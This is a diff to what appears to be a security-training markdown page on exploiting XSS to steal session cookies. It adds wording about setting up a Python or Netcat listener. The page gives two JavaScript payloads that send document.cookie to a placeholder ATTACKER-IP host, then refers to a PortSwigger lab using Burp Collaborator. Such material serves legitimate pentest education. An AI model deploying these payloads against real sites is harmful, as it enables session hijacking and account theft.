@@ -5,13 +5,12 @@ Stealing cookies is a traditional way to exploit XSS as most web applications us
 - The session might time out before you're able to hijack it.
 > Note: Make sure that `HttpOnly` is set to false before attempting this attack, otherwise, it will not work. This is because the `HttpOnly` flag helps mitigate the risk of client side scripting from accessing the protected cookies.
 ## XSS Payloads
-An attacker can start their own server using 
-
-submit the following payloads:
+An attacker can start their own server using Python's `http` module or start a Netcat listener and submit the following payloads:
 ```javascript
 document.location='http://ATTACKER-IP/index.php?c='+document.cookie;
 new Image().src='http://ATTACKER-IP/index.php?c='+btoa(document.cookie);
 ```
+Once the payload is triggered by a user visiting the vulnerable page, a HTTP request will be sent to the attacker's server containing the stolen cookie.
 ## Example from PortSwigger Academy
 1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
